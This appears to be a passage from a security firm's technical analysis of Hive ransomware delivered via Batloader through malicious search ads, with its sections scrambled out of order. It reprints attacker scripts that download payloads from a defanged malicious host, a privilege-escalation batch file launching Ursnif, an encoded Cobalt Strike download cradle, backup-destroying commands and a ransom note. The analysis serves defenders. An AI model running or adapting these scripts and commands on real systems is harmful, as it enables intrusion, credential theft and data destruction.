attempts to execute it with evaluated privileges by \u003ca rel=\"noopener noreferrer\" href=\"https://www.nirsoft.net/utils/nircmd.html\" target=\"_blank\"\u003enircmd.exe\u003c/a\u003e.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003epowershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/f69af5bc8498d0ebeb37b801d450c046/?servername=msi -OutFile requestadmin.bat\npowershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/c003996958c731652178c7113ad768b7/?servername=msi -OutFile nircmd.exe\n\ncmd  /c nircmd elevatecmd exec hide \"requestadmin.bat\"\nping  127.0.0.1 -n 20\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003eFigure 4: update.bat\u003c/p\u003e\n\u003cp\u003eThe \u0026ldquo;requestadmin.bat\u0026rdquo; then attempts to download further scripts named \u0026ldquo;runanddelete.bat\u0026rdquo; and \u0026ldquo;scripttodo.ps1\u0026rdquo;. The script itself also attempts to whitelist specific paths from Windows Defender before downloading \u003ca rel=\"noopener noreferrer\" href=\"https://nsudo.m2team.org/en-us/\" target=\"_blank\"\u003eNsudo.exe\u003c/a\u003e. Nsudo provides capabilities to execute binaries with elevated privileges, which are then used to edit the system registry to disable the user access control prompt and to disable task manager and other registry tools. The Windows power system settings tool Powercfg is then executed to disable sleep, which will allow the threat actor to maintain persistent access.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003eset pop=%systemroot%\ncd %APPDATA%\npowershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/a3874ddb552a5b45cade5a2700d15587/?servername=msi -OutFile runanddelete.bat\ncd %APPDATA%\npowershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/fa777fbbb8f055cb8bfcba6cb41c62e7/?servername=msi -OutFile scripttodo.ps1\nstart /b PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"\u0026amp; appears to be a modified open-source script named \u0026ldquo;\u003ca rel=\"noopener noreferrer\" href=\"https://gist.github.com/Maximus5/a7fb0a11b3c33e5d96b0\" target=\"_blank\"\u003eget-admin.bat\u003c/a\u003e\u0026rdquo;. This script attempts to spawn the user access control prompt to gain the increased privileges to then spawn an Administrator shell, via a created file named \u0026ldquo;getadmin.vbs\u0026rdquo;. Once increased privileges are achieved, it then attempts to run Ursnif (d2ef5.exe).  Ursnif can be used to extract system information and seek to steal user credentials.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003e@echo off\n\ntitle Installing Packages \n:: BatchGotAdmin\n::-------------------------------------\nREM  --\u0026gt; Check for permissions\n\u0026gt;nul 2\u0026gt;\u0026amp;1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\n\nREM --\u0026gt; If error flag set, we do not have admin.\nif '%errorlevel%' NEQ '0' (\n    echo Requesting administrative privileges...\n    goto UACPrompt\n) else ( goto gotAdmin )\n\n:UACPrompt\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) \u0026gt; \"%temp%\\getadmin.vbs\"\n    set params = %*:\"=\"\n    echo UAC.ShellExecute \"cmd.exe\", \"/c %~s0 %params%\", \"\", \"runas\", 0 \u0026gt;\u0026gt; \"%temp%\\getadmin.vbs\"\n\n    \"%temp%\\getadmin.vbs\"\n    del \"%temp%\\getadmin.vbs\"\n    exit /B\n\n:gotAdmin\n\necho  Installing Necessary Packages.....Please Wait.....\n\ncd %APPDATA%\n\nstart /b d2ef5.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003eFigure 6: runanddelete.bat\u003c/p\u003e\n\u003cp\u003eThe script \u0026ldquo;scripttodo.ps1\u0026rdquo; initially installs GNU Privacy Guard for Windows (\u0026ldquo;\u003ca rel=\"noopener noreferrer\" href=\"https://www.gpg4win.org/\" target=\"_blank\"\u003eGpg4Win\u003c/a\u003e\u0026rdquo;), which is a file encryption software. This is likely an attempt to dump NTLM credential hashes for password cracking, or for pass the hash techniques. PowerSploit has also been identified with attempts to run \u0026ldquo;Invoke-Kerberoast\u0026rdquo; to gain Kerberos ticket hashes for service accounts. This would likely provide the threat actor with increased privileges or access if successful.\u003c/p\u003e\n\u003cp\u003eMITRE ATT\u0026amp;CK: T1003.001: Credential Dumping \u0026ndash; LSASS Memory\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1558.003: Kerberoasting\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1550: Use Alternate Authentication Material\u003c/p\u003e\n\u003cp\u003eCommon remote access software such as Splashtop can be installed via Cobalt Strike to provide a persistent, seemingly legitimate access to the network. This also allows the threat actor to conduct hands-on operations. Remote Desktop Protocol (RDP) is used with legitimate accounts to navigate across the network.\u003c/p\u003e\n\u003cp\u003eMITRE ATT\u0026amp;CK: T1219: Remote Access Software\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1021: Remote Services\u003c/p\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003ch3 style=\"font-size: 20px;\"\u003eInternal Scouting\u003c/h3\u003e\n\u003cp\u003eOnce the threat actor gains a foothold within the network, Kroll has observed the use of tools such as \u003ca rel=\"noopener noreferrer\" href=\"https://attack.mitre.org/software/S0552/\" target=\"_blank\"\u003eADFind\u003c/a\u003e to identify accounts and servers. Other common tools such as nslookup and whoami have also been used to gain initial system information.\u003c/p\u003e\n\u003cp\u003eThe Exchange PowerShell module Get-DomainController has also been identified when leveraging Cobalt Strike to execute commands. This module provides information on the domain controller for the local domain. \u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003epowershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBzAHQAOgA3ADUANwAyAC8AJwApADsAIABHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIA\n\n---Decoded Base64 string---\nIEX (New-Object Net.Webclient).DownloadString('http://localhost:7572/'); Get-DomainController\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003eFigure 9: Example of Cobalt Strike commands\u003c/p\u003e\n\u003cp\u003eMITRE ATT\u0026amp;CK: T1482: Domain Trust Discovery\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1087: Account Discovery\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1016: System Network Configuration Discovery\u003c/p\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003ch3 style=\"font-size: 20px;\"\u003eMission Execution\u003c/h3\u003e\n\u003cp\u003eThe threat actors look to identify sensitive files for exfiltration before encrypting devices by using tools such as Rclone to automate data extraction to cloud storage. Kroll has observed that threat actors have searched for files using PowerShell and manual traversal across files.\u003c/p\u003e\n\u003cp\u003eMITRE ATT\u0026amp;CK: T1005: Data from Local System\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1567.002: Exfiltration Over Web Service : Exfiltration to Cloud Storage\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1020: Automate Exfiltration\u003c/p\u003e\n\u003cp\u003eTo push the ransomware binary across the network, the sysinternals tool PsExec has been leveraged as well as custom scripts to deploy the encryptor. The ransomware binary itself appears to come in both 64 and 32 bit versions. To encrypt, the binary requires the login and password \".\\windows_x64_encrypt.exe -u login:password\u0026rdquo;. There are other options available for file encryption including:\u003c/p\u003e\n\u003cul style=\"margin-left: 40px;\"\u003e\n    \u003cli\u003e-local-only: Encrypt only local files.\u003c/li\u003e\n    \u003cli\u003e-no-discovery: Do not look for network shares.\u003c/li\u003e\n    \u003cli\u003e-explicit-only: Encrypt specific directories.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eBy default, the binary prevents recovery by deleting volume shadow copies \u0026ldquo;vssadmin.exe delete shadows /all /quiet\u0026rdquo; and deletes system backups with \u0026ldquo;wbadmin.exe delete systemstatebackup\u0026rdquo; and \u0026ldquo;wbadmin.exe delete catalog-quiet\u0026rdquo; before preventing recovery from boot with \u0026ldquo;\\bcdedit.exe /set {default} recoveryenabled No\u0026rdquo; and \u0026ldquo;bcdedit.exe\" /set {default} bootstatuspolicy ignoreallfailures\u0026rdquo;. \u003ca rel=\"noopener noreferrer\" href=\"https://www.microsoft.com/en-us/security/blog/2022/07/05/hive-ransomware-gets-upgrades-in-rust/\" target=\"_blank\"\u003eThe binary encrypts files\u003c/a\u003e, except for \u0026ldquo;.lnk\u0026rdquo; files and binaries within \u0026ldquo;C:\\windows\u0026rdquo;, before generating two key files in the root of C:\\. The key files also determine the extension string added to the encrypted files along with a base64 encoded pointer.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003eYour network has been breached and all data were encrypted.                    \nPersonal data, financial reports and important documents are ready to disclose.\n\nTo decrypt all the data and to prevent exfiltrated files to be disclosed at    \nhttp://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd[.]onion/         \nyou will need to purchase our decryption software.   \n                          \nPlease contact our sales department at:   \n                                     \n   http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd[.]onion/      \n   \n      Login: \u0026lt;redacted\u0026gt;\u003credacted\u003e \n      Password: \u0026lt;redacted\u0026gt;\u003credacted\u003e\n\t  \nTo get an access to .onion websites download and install Tor Browser at:       \n   https://www.torproject[.]org/ (Tor Browser is not related to us) \n   \n   \nFollow the guidelines below to avoid losing your data:   \n                      \n - Do not modify, rename or delete *.key files. \u003c/td\u003e\n            \u003ctd\u003e\n            \u003cp\u003eThe threat actor utilized Cobalt Strike. Monitoring PowerShell execution can identify malicious activity associated with Cobalt Strike.\n            \u003c/p\u003e\n            \u003c/td\u003e\n        \u003c/tr\u003e\n        \u003ctr\u003e\n            \u003ctd\u003e\n            \u003cp\u003eEnable credential guard\u003c/p\u003e\n            \u003cp\u003e\u003ca rel=\"noopener noreferrer\" href=\"https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard\" target=\"_blank\"\u003eWindows Credential Guard\u003c/a\u003e can provide protection against password extraction and other authentication attacks.\u003c/p\u003e\n            \u003c/td\u003e\n            \u003ctd\u003e\n            \u003cp\u003eThe threat actor dumped LSASS and conducted Kerberos attacks. A new trend of initial infection vector (IIV) has been identified by Kroll analysts that may relate to the increase of activity and the varying nature of targets. Across a number of incidents, the IIV was attributed to IT administrators looking to download common softwares from Google such as TeamViewer, Zoom and AnyDesk, and they were provided with advertisements for these tools at the top of their search results. We recently \u003ca href=\"/en/insights/publications/cyber/threat-actors-google-ads-deploy-vidar-stealer\"\u003ereported\u003c/a\u003e\u0026nbsp;on this trend, where threat actors were abusing Google Ads to deploy malware via downloads.\u003c/p\u003e\n\u003cp\u003eWhen these IT administrators downloaded the desired \u0026ldquo;tools\u0026rdquo; from the malicious ad links, Batloader was also unknowingly delivered. Batloader is an initial access malware utilized to deliver tools such as Zloader, Ursnif and Vidar to further establish the threat actor\u0026rsquo;s foothold within a network. Cobalt Strike can then be installed to maintain command and control. Once the threat actor has acquired credentials and identified sensitive files for exfiltration, they are able to utilize common exfiltration tools such as WinSCP and \u003ca href=\"/en/insights/publications/cyber/new-m365-business-email-compromise-attacks-with-rclone\"\u003eRclone\u003c/a\u003e\u0026nbsp;to extract a victim\u0026rsquo;s data. The ransomware binary is then executed with a specific identifiable encryption key and this is used to create the ransom note named \u0026ldquo;HOW_TO_DECRYPT.txt\u0026rdquo; and appends a specific file extension related to a dropped key file within the root of C:\\.\u003c/p\u003e\n\u003cp\u003eA login is provided for the victim to access the Hive \u0026ldquo;Sales Department\u0026rdquo; onion site, and if demands are not met, data is then shared on their \u0026ldquo;Hive Leak\u0026rdquo; onion site.\u003c/p\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003ch2 style=\"font-size: 24px;\"\u003eTimeline of Incident\u003c/h2\u003e\n\u003cp style=\"text-align: center;\"\u003e\u003cimg src=\"https://edge.sitecorecloud.io/krollllc17bf0-kroll6fee-proda464-0e9b/media/Kroll-Images/Insights/hive-ransomware-technical-analysis-initial-access-discovery-timeline.svg\" style=\"height: 100%; width: 100%; margin-top: 0px; margin-bottom: 0px;\" alt=\"Hive Ransomware Technical Analysis and Initial Access Discovery\" /\u003e\u003c/p\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003ch3 style=\"font-size: 20px;\"\u003eInitial Exploit\u003c/h3\u003e\n\u003cp\u003eIn a recent case, after the IT administrator searched for TeamViewer and clicked the advertisement link, they were directed to https://caroseyama[.]xyz/9hjLXZR?https://www.teamviewer[.]com/en/customer-support. This link then redirected to https://teamviewclouds[.]com/index.php. Our experts analyzed the teamviewclouds domain and identified a large number of similar typosquatted domains for a wide range of common software hosted on the same IP address and hosted by regprivate[.]ru.\u0026nbsp; \u0026nbsp; Most of these domains were inactive, which suggests that the threat actors are continually creating new advertisements. An installation file is then provided from https://dc444.4sync[.]com/download/fXx-c_iZ/InstallerV36__218_.zip, which is the Batloader .msi file. The file sharing provider 4sync has been identified across separate Batloader incidents and appears to serve the Batloader .msi download.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003ezoomyclouds[.]com, zoomedes[.]com, zohosz[.]com, teamviewerq[.]com, teamviewer-cloudcomputing[.]com, teamviewclous[.]com, teamviewclouds[.]com, teamcloudcomputing[.]com, staroness[.]com, standartnotess[.]com, slackicorp[.]com, programmbatcheck[.]com, openofficee[.]com, logmein-cloud[.]com, logcloudmein[.]com, gimpimage[.]com, foxitr[.]com, fortinetq[.]com, fidelyclouds[.]com, evernotcorp[.]com, dom82[.]net, cloudsslack[.]com, anydeskos[.]com, anydeskis[.]com, anyclouddesk[.]com, adubecorp[.]com\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003eFigure 1: Example of Typosquatted domains associated with teamviewclouds[.]com\u003c/p\u003e\n\u003cp\u003eThe installer itself installed \u003ca rel=\"noopener noreferrer\" href=\"https://www.novapdf.com/\" target=\"_blank\"\u003enovaPDF\u003c/a\u003e by Softland rather than TeamViewer and dropped PowerShell scripts \u0026ldquo;scrED95.ps1\u0026rdquo; and \u0026ldquo;pssEDC6.ps1\u0026rdquo;. \u0026ldquo;pssEDC6.ps1\u0026rdquo; is a conversion script that creates the initial downloader script \u0026ldquo;scrED95.ps1\u0026rdquo;. This script downloads the initial Batloader script \u0026ldquo;update.bat\u0026rdquo; and sets the working directory to the user\u0026rsquo;s appdata local directory.
